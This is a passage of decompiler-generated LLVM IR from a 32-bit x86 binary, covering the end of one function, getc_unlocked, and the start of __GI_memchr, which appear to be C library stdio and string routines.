dec_label_pc_8062e82:                             ; preds = %dec_label_pc_8062e7e
  %v4_8062e82 = zext i8 %storemerge9 to i32
  %v7_8062e82 = or i32 %v3_8062e71, %v4_8062e82
  store i32 %v7_8062e82, i32* %edx.global-to-local, align 4
  %v0_8062e86 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8062e86 = add i32 %v0_8062e86, -2
  store i32 %v1_8062e86, i32* %eax.global-to-local, align 4
  %v3_8062e89 = add i32 %v0_8062e86, -1
  %v4_8062e89 = inttoptr i32 %v3_8062e89 to i8*
  store i8 %storemerge9, i8* %v4_8062e89, align 1
  %v5_8062e8c = load i32, i32* %edx.global-to-local, align 4
  %v6_8062e8c = and i32 %v5_8062e8c, -256
  %v7_8062e8c = or i32 %v6_8062e8c, %stack_var_-42.0
  store i32 %v7_8062e8c, i32* %edx.global-to-local, align 4
  %v2_8062e90 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8062e90 = add i32 %v2_8062e90, -2
  %v4_8062e90 = inttoptr i32 %v3_8062e90 to i8*
  store i8 %v1_8062e37, i8* %v4_8062e90, align 1
  %v0_8062e93 = load i32, i32* @ecx, align 4
  %v1_8062e93 = inttoptr i32 %v0_8062e93 to i32*
  store i32 112, i32* %v1_8062e93, align 4
  %v0_8062e99 = load i32, i32* %edi.global-to-local, align 4
  %v1_8062e99 = load i32, i32* @ecx, align 4
  %v2_8062e99 = add i32 %v1_8062e99, 4
  %v3_8062e99 = inttoptr i32 %v2_8062e99 to i32*
  store i32 %v0_8062e99, i32* %v3_8062e99, align 4
  %v0_8062e9c = load i32, i32* %eax.global-to-local, align 4
  %v1_8062e9c = load i32, i32* @ecx, align 4
  %v2_8062e9c = add i32 %v1_8062e9c, 8
  %v3_8062e9c = inttoptr i32 %v2_8062e9c to i32*
  store i32 %v0_8062e9c, i32* %v3_8062e9c, align 4
  %v0_8062e9f = load i32, i32* @ecx, align 4
  %v1_8062e9f = add i32 %v0_8062e9f, 12
  store i32 %v1_8062e9f, i32* @ecx, align 4
  br label %dec_label_pc_8062ea2

dec_label_pc_8062ea2:                             ; preds = %dec_label_pc_8062e27, %dec_label_pc_8062ad1, %dec_label_pc_8062e82
  %v0_8062f21 = phi i32 [ %v1_8062eaf121, %dec_label_pc_8062e27 ], [ %v2_8062ad9, %dec_label_pc_8062ad1 ], [ %v1_8062e9f, %dec_label_pc_8062e82 ]
  %v2_8062ea2 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8062ea2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8062ea6

dec_label_pc_8062ea6:                             ; preds = %dec_label_pc_8062ea6, %dec_label_pc_8062ea2
  %v0_8062ea6 = phi i32 [ %v2_8062ea2, %dec_label_pc_8062ea2 ], [ %v1_8062ea8, %dec_label_pc_8062ea6 ]
  %stack_var_-216.0 = phi i32 [ %v3_80629d3, %dec_label_pc_8062ea2 ], [ %v5_8062eab, %dec_label_pc_8062ea6 ]
  %v1_8062ea6 = inttoptr i32 %v0_8062ea6 to i32*
  %v2_8062ea6 = load i32, i32* %v1_8062ea6, align 4
  store i32 %v2_8062ea6, i32* %ebx.global-to-local, align 4
  %v1_8062ea8 = add i32 %v0_8062ea6, 12
  store i32 %v1_8062ea8, i32* %eax.global-to-local, align 4
  %v5_8062eab = sub i32 %stack_var_-216.0, %v2_8062ea6
  %v7_8062eaf = icmp ult i32 %v1_8062ea8, %v0_8062f21
  br i1 %v7_8062eaf, label %dec_label_pc_8062ea6, label %dec_label_pc_8062eb3

dec_label_pc_8062eb3:                             ; preds = %dec_label_pc_8062ea6
  store i32 %v0_8062f21, i32* %esi.global-to-local, align 4
  %v5_8062ec6 = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_8062ed6 = icmp eq i1 %v5_8062ec6, false
  %v2_8062ed6 = zext i1 %v1_8062ed6 to i32
  store i32 %v2_8062ed6, i32* %edx.global-to-local, align 4
  %v2_8062ed9 = sub i32 %v5_8062eab, %v2_8062ed6
  store i32 %v2_8062ed9, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_8062ed9, 1
  br i1 %tmp190, label %dec_label_pc_8062f23, label %dec_label_pc_8062ee3

dec_label_pc_8062ee3:                             ; preds = %dec_label_pc_8062eb3
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8062eea = inttoptr i32 %v1_8062a13 to i8*
  %v3_8062eea = load i8, i8* %v2_8062eea, align 1
  %v4_8062eea = and i8 %v3_8062eea, 8
  %v5_8062eea = icmp eq i8 %v4_8062eea, 0
  br i1 %v5_8062eea, label %dec_label_pc_8062f05, label %dec_label_pc_8062ef0

dec_label_pc_8062ef0:                             ; preds = %dec_label_pc_8062ee3
  %v1_8062ef0 = add i32 %v0_8062f21, 12
  store i32 %v1_8062ef0, i32* %esi.global-to-local, align 4
  %v1_8062ef3 = inttoptr i32 %v0_8062f21 to i32*
  store i32 160, i32* %v1_8062ef3, align 4
  %v1_8062ef9 = load i32, i32* @ecx, align 4
  %v2_8062ef9 = add i32 %v1_8062ef9, 4
  %v3_8062ef9 = inttoptr i32 %v2_8062ef9 to i32*
  store i32 %v2_8062ed9, i32* %v3_8062ef9, align 4
  %v0_8062efc = load i32, i32* @ecx, align 4
  %v1_8062efc = add i32 %v0_8062efc, 8
  %v2_8062efc = inttoptr i32 %v1_8062efc to i32*
  store i32 ptrtoint (i32* @global_var_806f333.810 to i32), i32* %v2_8062efc, align 4
  br label %dec_label_pc_8062f23

dec_label_pc_8062f05:                             ; preds = %dec_label_pc_8062ee3
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8062f0c = add i32 %tmp156, 16
  %v2_8062f0c = inttoptr i32 %v1_8062f0c to i32*
  %v3_8062f0c = load i32, i32* %v2_8062f0c, align 4
  %v9_8062f0c = icmp eq i32 %v3_8062f0c, 48
  %v1_8062f10 = icmp eq i1 %v9_8062f0c, false
  br i1 %v1_8062f10, label %dec_label_pc_8062f1d, label %dec_label_pc_8062f12

dec_label_pc_8062f12:                             ; preds = %dec_label_pc_8062f05
  %v3_8062f12 = load i32, i32* %stack_var_-152, align 4
  %v5_8062f12 = add i32 %v3_8062f12, %v2_8062ed9
  store i32 %v5_8062f12, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8062f21

dec_label_pc_8062f18:                             ; preds = %dec_label_pc_8062f29
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8062f50

dec_label_pc_8062f1d:                             ; preds = %dec_label_pc_8062f05
  br label %dec_label_pc_8062f21

dec_label_pc_8062f21:                             ; preds = %dec_label_pc_8062f12, %dec_label_pc_8062f1d
  store i32 %v0_8062f21, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8062f23

dec_label_pc_8062f23:                             ; preds = %dec_label_pc_8062eb3, %dec_label_pc_8062ef0, %dec_label_pc_8062f21
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8062f25 = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8062f25, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8062f29

dec_label_pc_8062f29:                             ; preds = %dec_label_pc_8062f47, %dec_label_pc_8062f23
  call void @__pseudo_call(i32 %tmp156)
  %v1_8062f42 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8062f42 = add i32 %v1_8062f42, 4
  %v3_8062f42 = inttoptr i32 %v2_8062f42 to i32*
  %v4_8062f42 = load i32, i32* %v3_8062f42, align 4
  %v15_8062f42 = icmp eq i32 %v2_8062ed9, %v4_8062f42
  %v1_8062f45 = icmp eq i1 %v15_8062f42, false
  br i1 %v1_8062f45, label %dec_label_pc_8062f18, label %dec_label_pc_8062f47

dec_label_pc_8062f47:                             ; preds = %dec_label_pc_8062f29
  %v1_8062f47 = add i32 %v1_8062f42, 12
  store i32 %v1_8062f47, i32* %ebx.global-to-local, align 4
  %v0_8062f4a = load i32, i32* %edi.global-to-local, align 4
  %v2_8062f4a = add i32 %v0_8062f4a, %v2_8062ed9
  store i32 %v2_8062f4a, i32* %edi.global-to-local, align 4
  %v1_8062f4c = load i32, i32* %esi.global-to-local, align 4
  %v7_8062f4c = icmp ult i32 %v1_8062f47, %v1_8062f4c
  br i1 %v7_8062f4c, label %dec_label_pc_8062f29, label %dec_label_pc_8062f50

dec_label_pc_8062f50:                             ; preds = %dec_label_pc_8062f47, %dec_label_pc_8062f18
  %v0_8062f56 = phi i32 [ -1, %dec_label_pc_8062f18 ], [ %v2_8062f4a, %dec_label_pc_8062f47 ]
  store i32 %v0_8062f56, i32* %eax.global-to-local, align 4
  %v2_8062f59 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8062f59, i32* @esi, align 4
  store i32 %v0_80629b6, i32* @edi, align 4
  store i32 %v0_80629b5, i32* @ebp, align 4
  ret i32 %v0_8062f56

; uselistorder directives
  uselistorder i32 %v0_8062f56, { 1, 0 }
  uselistorder i32 %v2_8062ed9, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_8062ed6, { 1, 0 }
  uselistorder i32 %v1_8062ea8, { 1, 2, 0 }
  uselistorder i32 %v0_8062ea6, { 1, 0 }
  uselistorder i32 %v0_8062f21, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8062e6c, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_8062e35, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8062e0e, { 1, 0 }
  uselistorder i32 %v1_8062e0e, { 1, 0, 2 }
  uselistorder i32 %v2_8062e0c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_8062dc9, { 1, 0 }
  uselistorder i32 %v2_8062d36, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8062d30, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_8062d8d, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_8062ccc, { 1, 0 }
  uselistorder i32 %v0_8062cc7, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8062c94, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_8062c8f, { 1, 0 }
  uselistorder i8 %v2_8062c88, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_8062c88, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_8062c12, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_8062bf7, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_8062bc2, { 1, 0 }
  uselistorder i32 %v2_8062b7b, { 2, 1, 0 }
  uselistorder i32 %v0_8062c31, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8062b4d, { 1, 0 }
  uselistorder x86_fp80 %v3_8062b2f, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_8062b2c, { 1, 0 }
  uselistorder x86_fp80 %v4_8062b14, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_8062b0e, { 1, 2, 0 }
  uselistorder i32 %v3_8062b0b, { 1, 0 }
  uselistorder i32 %v1_8062b04, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_8062b3d, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_8062b05, { 1, 0 }
  uselistorder i8 %v4_8062ab5, { 1, 0 }
  uselistorder i3 %v1_8062a52, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_80629da, { 1, 0, 2, 3 }
  uselistorder i32 %v3_80629d3, { 1, 0, 2 }
  uselistorder i3 %v4_80629cc, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 9, 8, 10, 12, 7, 4, 2, 3, 5, 0, 11, 1, 6 }
  uselistorder x86_fp80* %st0.global-to-local, { 5, 0, 1, 3, 6, 7, 2, 4, 8 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 5, 4, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 10, 8, 9, 11, 12, 3, 1, 2, 0, 4, 5, 6, 7 }
  uselistorder i32* %edx.global-to-local, { 14, 15, 16, 17, 18, 19, 28, 20, 21, 23, 25, 24, 26, 22, 27, 1, 4, 2, 5, 3, 6, 7, 8, 9, 10, 0, 11, 12, 13 }
  uselistorder i32* %edi.global-to-local, { 1, 3, 4, 2, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %ebx.global-to-local, { 15, 16, 17, 18, 19, 21, 22, 20, 23, 24, 25, 26, 28, 27, 29, 12, 0, 1, 2, 3, 7, 8, 4, 5, 6, 9, 10, 11, 13, 14 }
  uselistorder i32* %ebp.global-to-local, { 9, 10, 5, 6, 0, 3, 2, 1, 4, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 19, 20, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0, 1, 2, 3, 4, 21, 22, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 1, 2, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder i8 48, { 4, 5, 0, 3, 1, 2 }
  uselistorder i16 256, { 2, 3, 0, 1 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 13, { 0, 4, 3, 1, 2 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_8062f23, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8062f21, { 1, 0 }
  uselistorder label %dec_label_pc_8062ea2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062e4f, { 1, 0 }
  uselistorder label %dec_label_pc_8062e27, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062df6, { 1, 0 }
  uselistorder label %dec_label_pc_8062de3, { 1, 0 }
  uselistorder label %dec_label_pc_8062dc9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062d96, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062d81, { 1, 0 }
  uselistorder label %dec_label_pc_8062d76, { 1, 0 }
  uselistorder label %dec_label_pc_8062cfd, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062cef, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8062cb5, { 1, 0 }
  uselistorder label %dec_label_pc_8062c85.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8062c51, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8062c20, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8062c0b, { 1, 0 }
  uselistorder label %dec_label_pc_8062b77, { 1, 0 }
  uselistorder label %dec_label_pc_8062b4f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062b4d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8062b3d, { 1, 0 }
  uselistorder label %dec_label_pc_8062ad1, { 1, 0 }
  uselistorder label %dec_label_pc_80629fa, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_8()
  %stack_var_-5 = alloca i8, align 1
  %v0_8062f60 = load i32, i32* @ebx, align 4
  %v4_8062f64 = ptrtoint i16* %tmp to i32
  store i32 %v4_8062f64, i32* @ebx, align 4
  %v1_8062f68 = add i32 %v4_8062f64, 16
  %v2_8062f68 = inttoptr i32 %v1_8062f68 to i32*
  %v3_8062f68 = load i32, i32* %v2_8062f68, align 4
  %v2_8062f6b = add i32 %v4_8062f64, 24
  %v3_8062f6b = inttoptr i32 %v2_8062f6b to i32*
  %v4_8062f6b = load i32, i32* %v3_8062f6b, align 4
  %v10_8062f6b = icmp ult i32 %v3_8062f68, %v4_8062f6b
  br i1 %v10_8062f6b, label %dec_label_pc_806300d, label %dec_label_pc_8062f74

dec_label_pc_8062f74:                             ; preds = %entry
  %v2_8062f74 = load i16, i16* %tmp, align 2
  %v3_8062f74 = zext i16 %v2_8062f74 to i32
  %v1_8062f77 = and i32 %v3_8062f74, 131
  %v6_8062f81 = icmp ugt i32 %v1_8062f77, 128
  br i1 %v6_8062f81, label %dec_label_pc_8062f9b, label %dec_label_pc_8062f83

dec_label_pc_8062f83:                             ; preds = %dec_label_pc_8062f74
  %v0_8062f83 = load i32, i32* @edx, align 4
  %v5_8062f8b = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8062f83)
  %v1_8062f93 = icmp eq i32 %v5_8062f8b, 0
  %v1_8062f95 = icmp eq i1 %v1_8062f93, false
  br i1 %v1_8062f95, label %dec_label_pc_8063032, label %dec_label_pc_8062f83.dec_label_pc_8062f9b_crit_edge

dec_label_pc_8062f83.dec_label_pc_8062f9b_crit_edge: ; preds = %dec_label_pc_8062f83
  %v0_8062f9b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062f9b

dec_label_pc_8062f9b:                             ; preds = %dec_label_pc_8062f83.dec_label_pc_8062f9b_crit_edge, %dec_label_pc_8062f74
  %v2_8062fcf = phi i32 [ %v0_8062f9b.pre, %dec_label_pc_8062f83.dec_label_pc_8062f9b_crit_edge ], [ %v4_8062f64, %dec_label_pc_8062f74 ]
  %v1_8062f9b = inttoptr i32 %v2_8062fcf to i16*
  %v2_8062f9b = load i16, i16* %v1_8062f9b, align 2
  %v3_8062f9b = zext i16 %v2_8062f9b to i32
  store i32 %v3_8062f9b, i32* @ecx, align 4
  %v2_8062f9e = and i16 %v2_8062f9b, 2
  %v3_8062f9e = icmp eq i16 %v2_8062f9e, 0
  br i1 %v3_8062f9e, label %dec_label_pc_8062fbe, label %dec_label_pc_8062fa3

dec_label_pc_8062fa3:                             ; preds = %dec_label_pc_8062f9b
  %tmp20 = urem i16 %v2_8062f9b, 2
  %v1_8062fa5 = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8062fa5
  %v2_8062fa8 = and i32 %tmp19, 4
  %v3_8062fa8 = add i32 %v2_8062fcf, 36
  %v4_8062fa8 = add i32 %v3_8062fa8, %v2_8062fa8
  %v5_8062fa8 = inttoptr i32 %v4_8062fa8 to i8*
  %v6_8062fa8 = load i8, i8* %v5_8062fa8, align 1
  %v7_8062fa8 = zext i8 %v6_8062fa8 to i32
  %v8_8062fa8 = load i32, i32* @edx, align 4
  %v9_8062fa8 = and i32 %v8_8062fa8, -256
  %v10_8062fa8 = or i32 %v9_8062fa8, %v7_8062fa8
  store i32 %v10_8062fa8, i32* %edx.global-to-local, align 4
  %v1_8062fac = add i16 %v2_8062f9b, -1
  store i16 %v1_8062fac, i16* %v1_8062f9b, align 2
  %v0_8062fb2 = load i32, i32* @ebx, align 4
  %v1_8062fb2 = add i32 %v0_8062fb2, 40
  %v2_8062fb2 = inttoptr i32 %v1_8062fb2 to i32*
  store i32 0, i32* %v2_8062fb2, align 4
  %v0_8062fb9 = load i32, i32* %edx.global-to-local, align 4
  %v1_8062fb9 = urem i32 %v0_8062fb9, 256
  store i32 %v1_8062fb9, i32* @edx, align 4
  br label %dec_label_pc_8063035

dec_label_pc_8062fbe:                             ; preds = %dec_label_pc_8062f9b
  %v1_8062fbe = add i32 %v2_8062fcf, 16
  %v2_8062fbe = inttoptr i32 %v1_8062fbe to i32*
  %v3_8062fbe = load i32, i32* %v2_8062fbe, align 4
  %v1_8062fc1 = add i32 %v2_8062fcf, 20
  %v2_8062fc1 = inttoptr i32 %v1_8062fc1 to i32*
  %v3_8062fc1 = load i32, i32* %v2_8062fc1, align 4
  %v15_8062fc1 = icmp eq i32 %v3_8062fc1, %v3_8062fbe
  %v1_8062fc4 = icmp eq i1 %v15_8062fc1, false
  br i1 %v1_8062fc4, label %dec_label_pc_806300d, label %dec_label_pc_8062fc6

dec_label_pc_8062fc6:                             ; preds = %dec_label_pc_8062fbe
  %v1_8062fc6 = add i32 %v2_8062fcf, 4
  %v2_8062fc6 = inttoptr i32 %v1_8062fc6 to i32*
  %v3_8062fc6 = load i32, i32* %v2_8062fc6, align 4
  %v13_8062fc6 = icmp eq i32 %v3_8062fc6, -2
  %v1_8062fca = icmp eq i1 %v13_8062fc6, false
  br i1 %v1_8062fca, label %dec_label_pc_8062fd4, label %dec_label_pc_8062fcc

dec_label_pc_8062fcc:                             ; preds = %dec_label_pc_8062fc6
  %v1_8062fcc = or i32 %v3_8062f9b, 4
  store i32 %v1_8062fcc, i32* @ecx, align 4
  %v1_8062fcf = trunc i32 %v1_8062fcc to i16
  store i16 %v1_8062fcf, i16* %v1_8062f9b, align 2
  br label %dec_label_pc_8063032

dec_label_pc_8062fd4:                             ; preds = %dec_label_pc_8062fc6
  %v3_8062fd4 = and i16 %v2_8062f9b, 768
  %v4_8062fd4 = icmp eq i16 %v3_8062fd4, 0
  br i1 %v4_8062fd4, label %dec_label_pc_8062fe9, label %dec_label_pc_8062fd9

dec_label_pc_8062fd9:                             ; preds = %dec_label_pc_8062fd4
  %v3_8062fe1 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8074d7c.667 to i16*))
  %v0_8062fe9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8062fe9

dec_label_pc_8062fe9:                             ; preds = %dec_label_pc_8062fd4, %dec_label_pc_8062fd9
  %v0_806301e = phi i32 [ %v2_8062fcf, %dec_label_pc_8062fd4 ], [ %v0_8062fe9.pre, %dec_label_pc_8062fd9 ]
  %v1_8062fe9 = add i32 %v0_806301e, 8
  %v2_8062fe9 = inttoptr i32 %v1_8062fe9 to i32*
  %v3_8062fe9 = load i32, i32* %v2_8062fe9, align 4
  %v1_8062fec = add i32 %v0_806301e, 12
  %v2_8062fec = inttoptr i32 %v1_8062fec to i32*
  %v3_8062fec = load i32, i32* %v2_8062fec, align 4
  %v15_8062fec = icmp eq i32 %v3_8062fec, %v3_8062fe9
  br i1 %v15_8062fec, label %dec_label_pc_8063016, label %dec_label_pc_8062ff1

dec_label_pc_8062ff1:                             ; preds = %dec_label_pc_8062fe9
  %v2_8062ff4 = add i32 %v0_806301e, 24
  %v3_8062ff4 = inttoptr i32 %v2_8062ff4 to i32*
  store i32 %v3_8062fe9, i32* %v3_8062ff4, align 4
  %v0_8062ff7 = load i32, i32* @ebx, align 4
  %v2_8062ff8 = call i32 @__stdio_rfill(i32 %v0_8062ff7)
  %v1_8063000 = icmp eq i32 %v2_8062ff8, 0
  br i1 %v1_8063000, label %dec_label_pc_8063032, label %dec_label_pc_8063004

dec_label_pc_8063004:                             ; preds = %dec_label_pc_8062ff1
  %v0_8063004 = load i32, i32* @ebx, align 4
  %v1_8063004 = add i32 %v0_8063004, 20
  %v2_8063004 = inttoptr i32 %v1_8063004 to i32*
  %v3_8063004 = load i32, i32* %v2_8063004, align 4
  %v2_8063007 = add i32 %v0_8063004, 24
  %v3_8063007 = inttoptr i32 %v2_8063007 to i32*
  store i32 %v3_8063004, i32* %v3_8063007, align 4
  %v0_806300a = load i32, i32* @ebx, align 4
  %v1_806300a = add i32 %v0_806300a, 16
  %v2_806300a = inttoptr i32 %v1_806300a to i32*
  %v3_806300a = load i32, i32* %v2_806300a, align 4
  br label %dec_label_pc_806300d

dec_label_pc_806300d:                             ; preds = %dec_label_pc_8062fbe, %entry, %dec_label_pc_8063004
  %v1_8063011 = phi i32 [ %v2_8062fcf, %dec_label_pc_8062fbe ], [ %v4_8062f64, %entry ], [ %v0_806300a, %dec_label_pc_8063004 ]
  %v0_806300d = phi i32 [ %v3_8062fbe, %dec_label_pc_8062fbe ], [ %v3_8062f68, %entry ], [ %v3_806300a, %dec_label_pc_8063004 ]
  %v1_806300d = inttoptr i32 %v0_806300d to i8*
  %v2_806300d = load i8, i8* %v1_806300d, align 1
  %v3_806300d = zext i8 %v2_806300d to i32
  store i32 %v3_806300d, i32* @edx, align 4
  %v1_8063010 = add i32 %v0_806300d, 1
  %v2_8063011 = add i32 %v1_8063011, 16
  %v3_8063011 = inttoptr i32 %v2_8063011 to i32*
  store i32 %v1_8063010, i32* %v3_8063011, align 4
  %v0_8063038.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8063035

dec_label_pc_8063016:                             ; preds = %dec_label_pc_8062fe9
  %v2_8063019 = ptrtoint i8* %stack_var_-5 to i32
  %v5_806301e = inttoptr i32 %v0_806301e to i16*
  %v5_806301f = call i32 @__stdio_READ(i16* %v5_806301e, i32 %v2_8063019, i32 1)
  %v1_8063027 = icmp eq i32 %v5_806301f, 0
  br i1 %v1_8063027, label %dec_label_pc_8063032, label %dec_label_pc_806302b

dec_label_pc_806302b:                             ; preds = %dec_label_pc_8063016
  %v3_806302b = load i8, i8* %stack_var_-5, align 1
  %v4_806302b = sext i8 %v3_806302b to i32
  store i32 %v4_806302b, i32* @edx, align 4
  br label %dec_label_pc_8063035

dec_label_pc_8063032:                             ; preds = %dec_label_pc_8063016, %dec_label_pc_8062ff1, %dec_label_pc_8062f83, %dec_label_pc_8062fcc
  store i32 -1, i32* @edx, align 4
  br label %dec_label_pc_8063035

dec_label_pc_8063035:                             ; preds = %dec_label_pc_806302b, %dec_label_pc_806300d, %dec_label_pc_8062fa3, %dec_label_pc_8063032
  %v0_8063038 = phi i32 [ %v4_806302b, %dec_label_pc_806302b ], [ %v0_8063038.pre, %dec_label_pc_806300d ], [ %v1_8062fb9, %dec_label_pc_8062fa3 ], [ -1, %dec_label_pc_8063032 ]
  store i32 %v0_8062f60, i32* @ebx, align 4
  ret i32 %v0_8063038

; uselistorder directives
  uselistorder i32 %v0_806300d, { 1, 0 }
  uselistorder i32 %v3_8062fe9, { 1, 0 }
  uselistorder i32 %v0_806301e, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8062fbe, { 1, 0 }
  uselistorder i32 %v1_8062fb9, { 1, 0 }
  uselistorder i16 %v2_8062f9b, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_8062fcf, { 1, 2, 3, 5, 4, 0, 6 }
  uselistorder i8* %stack_var_-5, { 1, 0 }
  uselistorder i32 131, { 1, 0 }
  uselistorder label %dec_label_pc_8063035, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8063032, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_806300d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8062fe9, { 1, 0 }
}

define i32 @__GI_memchr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_806303c = load i32, i32* @edi, align 4
  store i32 %v0_806303c, i32* %stack_var_-4, align 4
  store i32 %arg3, i32* @ecx, align 4
  %v4_8063043 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8063043, i32* %edi.global-to-local, align 4
  %v1_806304b = icmp eq i32 %arg3, 0
  store i1 %v1_806304b, i1* %zf.global-to-local, align 1
  br i1 %v1_806304b, label %dec_label_pc_806305b, label %dec_label_pc_806304f

dec_label_pc_806304f:                             ; preds = %entry
  %v2_806304f = call i32 @_strlen(i8* %arg1)
  %v3_806304f = mul i32 %v2_806304f, -1
  %v4_806304f = add i32 %v3_806304f, -2
  store i32 %v4_806304f, i32* @ecx, align 4
  %v0_8063051 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8063051, label %dec_label_pc_806304f.dec_label_pc_8063058_crit_edge, label %dec_label_pc_8063053

dec_label_pc_806304f.dec_label_pc_8063058_crit_edge: ; preds = %dec_label_pc_806304f
  %v0_8063058.pre = load i32, i32* %edi.global-to-local, align 4
  %phitmp = add i32 %v0_8063058.pre, -1
  br label %dec_label_pc_8063058

dec_label_pc_8063053:                             ; preds = %dec_label_pc_806304f
  store i32 1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8063058

dec_label_pc_8063058:                             ; preds = %dec_label_pc_806304f.dec_label_pc_8063058_crit_edge, %dec_label_pc_8063053
  %v0_8063058 = phi i32 [ %phitmp, %dec_label_pc_806304f.dec_label_pc_8063058_crit_edge ], [ 0, %dec_label_pc_8063053 ]
  %v8_8063058 = icmp eq i32 %v0_8063058, 0
  store i1 %v8_8063058, i1* %zf.global-to-local, align 1
  store i32 %v0_8063058, i32* %edi.global-to-local, align 4
  %v2_806305b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_806305b

dec_label_pc_806305b:                             ; preds = %entry, %dec_label_pc_8063058
  %v0_806305c = phi i32 [ 0, %entry ], [ %v0_8063058, %dec_label_pc_8063058 ]
